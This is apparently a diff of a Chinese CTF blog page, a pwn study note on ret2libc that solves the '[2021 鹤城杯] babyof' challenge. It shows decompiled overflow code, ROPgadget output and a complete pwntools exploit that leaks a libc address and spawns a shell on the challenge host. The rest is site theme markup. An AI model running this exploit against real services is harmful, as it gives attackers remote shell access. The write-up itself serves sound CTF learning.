 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_400632</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you know how to do buffer overflow?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;I hope you win&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>​	很不错，很明显，这个就是漏洞函数，那么，先用 cyclic 算一下偏移量，得到的是 72：</p>
-<p><img data-src="https://img-blog.csdnimg.cn/direct/b60c8d0628ed44e2bda0cff18649dcf3.png#pic_center" alt="在这里插入图片描述"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/direct/b60c8d0628ed44e2bda0cff18649dcf3.png#pic_center" alt="在这里插入图片描述"></p>
 <p>​	之后，还需要 ret 和 pop rdi;ret 的 gadgets，所以用 ROPgadget 来查：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@g01den-virtual-machine:/mnt/shared<span class="comment"># ROPgadget --binary babyof --only &quot;pop|ret&quot;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x000000000040073c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040073e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400740 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400742 : pop r15 ; ret</span><br><span class="line">0x000000000040073b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040073f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400619 : pop rbp ; ret</span><br><span class="line">0x0000000000400743 : pop rdi ; ret</span><br><span class="line">0x0000000000400741 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x000000000040073d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400506 : ret</span><br><span class="line">0x0000000000400870 : ret 0xfffd</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 12</span><br></pre></td></tr></table></figure>
 <p>​	发现找到了，地址是 0x0000000000400506 和 0x0000000000400743，之后就是编写攻击脚本：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>, <span class="number">28230</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./babyof&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#第一次调用puts函数，然后泄露puts函数的真实地址</span></span><br><span class="line">ret = <span class="number">0x400506</span></span><br><span class="line">pop_rdi = <span class="number">0x400743</span></span><br><span class="line">func_vuln_addr = <span class="number">0x400632</span></span><br><span class="line">payload = flat([cyclic(<span class="number">0x40</span> + <span class="number">0x08</span>), pop_rdi, elf.got[<span class="string">&#x27;puts&#x27;</span>], elf.plt[<span class="string">&#x27;puts&#x27;</span>], func_vuln_addr])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Do you know how to do buffer overflow?\n&quot;</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;win\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#接收了puts函数的真实地址，ljust之后对齐，再然后就是通过u64打包</span></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)    <span class="comment">#这个函数有两个参数，第一个参数是已经泄露了地址的函数，第二个参数是该函数的地址</span></span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>) <span class="comment">#使用dump函数得到相对于基地址的偏移地址，然后函数真实地址-偏移地址得到基地址</span></span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">str_bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = flat([cyclic(<span class="number">0x40</span> + <span class="number">0x08</span>), ret, pop_rdi, str_bin_sh, system_addr])</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Do you know how to do buffer overflow?\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <p>​	为啥第二个 payload 需要加上一个 ret 的地址，大佬的解释如下：</p>
-<p><img data-src="https://img-blog.csdnimg.cn/direct/bd744137c4ae4baab0a4b3f11265b4df.png#pic_center" alt="在这里插入图片描述"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/direct/bd744137c4ae4baab0a4b3f11265b4df.png#pic_center" alt="在这里插入图片描述"></p>
 <p>​	其实就是对于 Ubuntu18 或者更高的系统，需要完成 16 字节对齐，否则会直接终止程序。</p>
 <p>​	最后，运行脚本，在那 10 个版本中选择，直到拿到正确的为止。</p>
-
-      <div class="tags">
-          <a href="/tags/Pwn/" rel="tag"><i class="ic i-tag"></i> Pwn</a>
-      </div>
-  </div>
-
-   <footer>
-
-    <div class="meta">
-  <span class="item">
-    <span class="icon">
-      <i class="ic i-calendar-check"></i>
-    </span>
-    <span class="text">更新于</span>
-    <time title="修改时间：2024-06-20 21:28:39" itemprop="dateModified" datetime="2024-06-20T21:28:39+08:00">2024-06-20</time>
-  </span>
-</div>
-
-      
-<div class="reward">
-  <button><i class="ic i-heartbeat"></i> 赞赏</button>
-  <p>请我喝[茶]~(￣▽￣)~*</p>
-  <div id="qr">
-      
-      <div>
-        <img data-src="/images/wechatpay.png" alt="g01den 微信支付">
-        <p>微信支付</p>
-      </div>
-      
-      <div>
-        <img data-src="/images/alipay.png" alt="g01den 支付宝">
-        <p>支付宝</p>
-      </div>
-      
-      <div>
-        <img data-src="/images/paypal.png" alt="g01den 贝宝">
-        <p>贝宝</p>
-      </div>
-  </div>
-</div>
-
-      
-
-<div id="copyright">
-<ul>
-  <li class="author">
-    <strong>本文作者： </strong>g01den <i class="ic i-at"><em>@</em></i>golden的部落阁
-  </li>
-  <li class="link">
-    <strong>本文链接：</strong>
-    <a href="http://blog.g01den.top/posts/52965aaa.html" title="pwn学习笔记（4）ret2libc">http://blog.g01den.top/posts/52965aaa.html</a>
-  </li>
-  <li class="license">
-    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC96aC1DTg=="><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
-  </li>
-</ul>
-</div>
-
-  </footer>
-
-</article>
-
-  </div>
-  
-
-<div class="post-nav">
-    <div class="item left">
-      
-
-  <a href="/posts/e20e7502.html" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;gitee.com&#x2F;gou-dengyue&#x2F;images&#x2F;raw&#x2F;master&#x2F;picture108.jpg" title="pwn学习笔记（3）ret2syscall">
-  <span class="type">上一篇</span>
-  <span class="category"><i class="ic i-flag"></i> Pwn手的自我修养</span>
-  <h3>pwn学习笔记（3）ret2syscall</h3>
-  </a>
-
-    </div>
-    <div class="item right">
-      
-
-  <a href="/posts/384200ef.html" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;gitee.com&#x2F;gou-dengyue&#x2F;images&#x2F;raw&#x2F;master&#x2F;picture5.jpg" title="SQL无列名注入">
-  <span class="type">下一篇</span>
-  <span class="category"><i class="ic i-flag"></i> Web狗的自我安慰</span>
-  <h3>SQL无列名注入</h3>
-  </a>
-
-    </div>
-</div>
-
-  
-  <div class="wrap" id="comments"></div>
-
-
-        </div>
-        <div id="sidebar">
-          
-
-<div class="inner">
-
-  <div class="panels">
-    <div class="inner">
-      <div class="contents panel pjax" data-title="文章目录">
-          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B04"><span class="toc-number">1.</span> <span class="toc-text"> pwn 学习笔记（4）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5"><span class="toc-number">1.1.</span> <span class="toc-text"> 静态链接：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5"><span class="toc-number">1.2.</span> <span class="toc-text"> 动态链接：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E7%AE%80%E8%BF%B0"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 1. 简述：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E8%BF%87%E7%A8%8B"><span class="toc-number">1.2.2.</span> <span class="toc-text"> 2. 过程：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%B0%83%E7%94%A8%E4%BB%A5printf%E4%B8%BE%E4%BE%8B"><span class="toc-number">1.2.2.1.</span> <span class="toc-text"> 第一次调用（以 printf () 举例）：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AC%A1%E8%B0%83%E7%94%A8"><span class="toc-number">1.2.2.2.</span> <span class="toc-text"> 第二次调用：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%85%E8%B0%88%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E4%B8%AD%E7%9A%84%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92"><span class="toc-number">1.3.</span> <span class="toc-text"> 浅谈函数调用中的参数传递：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2libc"><span class="toc-number">1.4.</span> <span class="toc-text"> ret2libc：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E6%83%85%E5%86%B51"><span class="toc-number">1.4.1.</span> <span class="toc-text"> 1. 情况 1：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%A1%88%E4%BE%8Bctf-wikiret2libc1"><span class="toc-number">1.4.1.1.</span> <span class="toc-text"> 题目案例：CTF-Wiki–ret2libc1：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E6%83%85%E5%86%B52"><span class="toc-number">1.4.2.</span> <span class="toc-text"> 2. 情况 2：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%A1%88%E4%BE%8Bctf-wikiret2libc2"><span class="toc-number">1.4.2.1.</span> <span class="toc-text"> 题目案例：CTF-Wiki–ret2libc2：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E6%83%85%E5%86%B53"><span class="toc-number">1.4.3.</span> <span class="toc-text"> 3. 情况 3：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%A1%88%E4%BE%8B2021-%E9%B9%A4%E5%9F%8E%E6%9D%AFbabyof"><span class="toc-number">1.4.3.1.</span> <span class="toc-text"> 题目案例：[2021 鹤城杯] babyof：</span></a></li></ol></li></ol></li></ol></li></ol>
-      </div>
-      <div class="related panel pjax" data-title="系列文章">
-        <ul>
-          <li><a href="/posts/c06afb6e.html" rel="bookmark" title="Pwn学习笔记（1）--前置知识">Pwn学习笔记（1）--前置知识</a></li><li><a href="/posts/c3c1bd42.html" rel="bookmark" title="Pwn学习笔记（2）--ret_2_text_or_shellcode">Pwn学习笔记（2）--ret_2_text_or_shellcode</a></li><li><a href="/posts/e20e7502.html" rel="bookmark" title="pwn学习笔记（3）ret2syscall">pwn学习笔记（3）ret2syscall</a></li><li class="active"><a href="/posts/52965aaa.html" rel="bookmark" title="pwn学习笔记（4）ret2libc">pwn学习笔记（4）ret2libc</a></li><li><a href="/posts/a698ff8.html" rel="bookmark" title="pwn学习笔记（5）--格式化字符串漏洞（未完全完成）">pwn学习笔记（5）--格式化字符串漏洞（未完全完成）</a></li><li><a href="/posts/cbafa55d.html" rel="bookmark" title="pwn学习笔记（6）--堆基础概述">pwn学习笔记（6）--堆基础概述</a></li><li><a href="/posts/efb4c08.html" rel="bookmark" title="pwn学习笔记（7）--堆相关源码">pwn学习笔记（7）--堆相关源码</a></li><li><a href="/posts/d7e2e20f.html" rel="bookmark" title="pwn学习笔记（0）-事后补充">pwn学习笔记（0）-事后补充</a></li><li><a href="/posts/9b0d93f7.html" rel="bookmark" title="Pwn刷题记录（不停更新）">Pwn刷题记录（不停更新）</a></li><li><a href="/posts/2c0210e1.html" rel="bookmark" title="how2heap_zh">how2heap_zh</a></li><li><a href="/posts/9d5b1ce4.html" rel="bookmark" title="pwn学习笔记（8）-初识沙箱">pwn学习笔记（8）-初识沙箱</a></li><li><a href="/posts/c8624158.html" rel="bookmark" title="pwn学习笔记（9）-中级ROP--ret2csu">pwn学习笔记（9）-中级ROP--ret2csu</a></li><li><a href="/posts/540e5c20.html" rel="bookmark" title="Pwn学习笔记（10）--UAF">Pwn学习笔记（10）--UAF</a></li><li><a href="/posts/f1497b96.html" rel="bookmark" title="pwn学习笔记（11）--off_by_one">pwn学习笔记（11）--off_by_one</a></li><li><a href="/posts/d1a08bca.html" rel="bookmark" title="pwn学习笔记（12）--Chunk Extend and Overlapping">pwn学习笔记（12）--Chunk Extend and Overlapping</a></li>
-        </ul>
-      </div>
-      <div class="overview panel" data-title="站点概览">
-        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <img class="image" itemprop="image" alt="g01den"
-      data-src="/images/avatar.jpg">
-  <p class="name" itemprop="name">g01den</p>
-  <div class="description" itemprop="description">golden的部落阁</div>
-</div>
-
-<nav class="state">
-    <div class="item posts">
-      <a href="/archives/">
-        <span class="count">47</span>
-        <span class="name">文章</span>
-      </a>
-    </div>
-    <div class="item categories">
-      <a href="/categories/">
-        <span class="count">10</span>
-        <span class="name">分类</span>
-      </a>
-    </div>
-    <div class="item tags">
-      <a href="/tags/">
-        <span class="count">8</span>
-        <span class="name">标签</span>
-      </a>
-    </div>
-</nav>
-
-<div class="social">
-      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL2cwMWRlbjE=" title="https:&#x2F;&#x2F;github.com&#x2F;g01den1"><i class="ic i-github"></i></span>
-</div>
-
-<ul class="menu">
-  
-    
-  <li class="item">
-    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
-  </li>
-
-    
-  <li class="item">
-    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
-  </li>
-
-        
-  <li class="item dropdown">
-      <a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a>
-    <ul class="submenu">
-
-        
-  <li class="item">
-    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
-  </li>
-
-        
-  <li class="item">
-    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
-  </li>
-
-        
-  <li class="item">
-    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
-  </li>
-
-  </ul>
-    
-  <li class="item">
-    <a href="/links/" rel="section"><i class="ic i-magic"></i>links</a>
-  </li>
-
-
-</ul>
-
-      </div>
-    </div>
-  </div>
-
-  <ul id="quick">
-    <li class="prev pjax">
-        <a href="/posts/e20e7502.html" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
-    </li>
-    <li class="up"><i class="ic i-arrow-up"></i></li>
-    <li class="down"><i class="ic i-arrow-down"></i></li>
-    <li class="next pjax">
-        <a href="/posts/384200ef.html" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
-    </li>
-    <li class="percent"></li>
-  </ul>
-</div>
-
-
-        </div>
-        <div class="dimmer"></div>
-      </div>
-    </main>
-    <footer id="footer">
-      <div class="inner">
-        <div class="widgets">
-          
-<div class="rpost pjax">
-  <h2>随机文章</h2>
-  <ul>
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/Game/" title="分类于 CTFer的比赛之路">CTFer的比赛之路</a>
-</div>
-
-    <span><a href="/posts/de34fe7b.html" title="【2024】HECTF-个人整理向">【2024】HECTF-个人整理向</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
-</div>
-
-    <span><a href="/posts/f1497b96.html" title="pwn学习笔记（11）--off_by_one">pwn学习笔记（11）--off_by_one</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/Daily/" title="分类于 发电日常">发电日常</a>
-</div>
-
-    <span><a href="/posts/cf99ed43.html" title="从NSSCTF开始的复建之路">从NSSCTF开始的复建之路</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/Game/" title="分类于 CTFer的比赛之路">CTFer的比赛之路</a>
-</div>
-
-    <span><a href="/posts/c2860616.html" title="网鼎杯2024青龙组官方资格赛wp">网鼎杯2024青龙组官方资格赛wp</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
-</div>
-
-    <span><a href="/posts/9b0d93f7.html" title="Pwn刷题记录（不停更新）">Pwn刷题记录（不停更新）</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
-</div>
-
-    <span><a href="/posts/c8624158.html" title="pwn学习笔记（9）-中级ROP--ret2csu">pwn学习笔记（9）-中级ROP--ret2csu</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
-</div>
-
-    <span><a href="/posts/d7e2e20f.html" title="pwn学习笔记（0）-事后补充">pwn学习笔记（0）-事后补充</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/Game/" title="分类于 CTFer的比赛之路">CTFer的比赛之路</a>
-</div>
-
-    <span><a href="/posts/4bf5e0ee.html" title="【2024】LitCTF">【2024】LitCTF</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/Major/" title="分类于 考研专业课">考研专业课</a>
-<i class="ic i-angle-right"></i>
-<a href="/categories/Major/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" title="分类于 数据结构">数据结构</a>
-</div>
-
-    <span><a href="/posts/95e7063c.html" title="数据结构笔记-2、线性表">数据结构笔记-2、线性表</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
-</div>
-
-    <span><a href="/posts/4826d2ce.html" title="ctfshow-SSTI">ctfshow-SSTI</a></span>
-  </li>
-
-  </ul>
-</div>
-<div>
-  <h2>最新评论</h2>
-  <ul class="leancloud-recent-comment"></ul>
-</div>
-
-        </div>
-        <div class="status">
-  <div class="copyright">
-    
-    &copy; 2010 – 
-    <span itemprop="copyrightYear">2025</span>
-    <span class="with-love">
-      <i class="ic i-sakura rotate"></i>
-    </span>
-    <span class="author" itemprop="copyrightHolder">g01den @ golden的部落阁</span>
-  </div>
-  <div class="powered-by">
-    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
-     <p><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn">蜀ICP备2024083302号</a><!--|<a target="_blank" rel="noopener" href="https://beian.mps.gov.cn/#/query/webSearch">公网安备XXXXXXXX号</a> -->
-  </div>
-</div>
-
-      </div>
-    </footer>
-  </div>
-<script data-config type="text/javascript">
-  var LOCAL = {
-    path: 'posts/52965aaa.html',
-    favicon: {
-      show: "（●´3｀●）やれやれだぜ",
-      hide: "(´Д｀)大変だ！"
-    },
-    search : {
-      placeholder: "文章搜索",
-      empty: "关于 「 ${query} 」，什么也没搜到",
-      stats: "${time} ms 内找到 ${hits} 条结果"
-    },
-    valine: true,fancybox: true,
-    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
-    ignores : [
-      function(uri) {
-        return uri.includes('#');
-      },
-      function(uri) {
-        return new RegExp(LOCAL.path+"$").test(uri);
-      }
-    ]
-  };
-</script>
-
-<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
-
-<script src="//fastly.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
-
-<script src="/js/app.js?v=0.2.5"></script>
-
-
-
-
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body>
-</html>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://blog.g01den.top">g01den</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://blog.g01den.top/posts/52965aaa.html">http://blog.g01den.top/posts/52965aaa.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://blog.g01den.top" target="_blank">golden的部落阁</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Pwn/">Pwn</a></div><div class="post_share"><div class="social-share" data-image="https://gitee.com/gou-dengyue/images/raw/master/picture131.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/384200ef.html" title="SQL无列名注入"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://gitee.com/gou-dengyue/images/raw/master/picture5.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">SQL无列名注入</div></div></a></div><div class="next-post pull-right"><a href="/posts/e20e7502.html" title="pwn学习笔记（3）ret2syscall"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://gitee.com/gou-dengyue/images/raw/master/picture108.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">pwn学习笔记（3）ret2syscall</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/540e5c20.html" title="Pwn学习笔记（10）--UAF"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s2.loli.net/2024/11/05/hQ5dotLSvj7m96u.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-05</div><div class="title">Pwn学习笔记（10）--UAF</div></div></a></div><div><a href="/posts/c3c1bd42.html" title="Pwn学习笔记（2）--ret_2_text_or_shellcode"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://gitee.com/gou-dengyue/images/raw/master/picture107.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-02-04</div><div class="title">Pwn学习笔记（2）--ret_2_text_or_shellcode</div></div></a></div><div><a href="/posts/2c0210e1.html" title="how2heap_zh"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://gitee.com/gou-dengyue/images/raw/master/picture230.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-25</div><div class="title">how2heap_zh</div></div></a></div><div><a href="/posts/9b0d93f7.html" title="Pwn刷题记录（不停更新）"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://gitee.com/gou-dengyue/images/raw/master/picture300.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-23</div><div class="title">Pwn刷题记录（不停更新）</div></div></a></div><div><a href="/posts/c06afb6e.html" title="Pwn学习笔记（1）--前置知识"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://gitee.com/gou-dengyue/images/raw/master/picture66.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-02-04</div><div class="title">Pwn学习笔记（1）--前置知识</div></div></a></div><div><a href="/posts/d7e2e20f.html" title="pwn学习笔记（0）-事后补充"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://gitee.com/gou-dengyue/images/raw/master/picture49.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-23</div><div class="title">pwn学习笔记（0）-事后补充</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://thirdqq.qlogo.cn/headimg_dl?dst_uin=2082045221&amp;spec=640&amp;img_type=jpg" 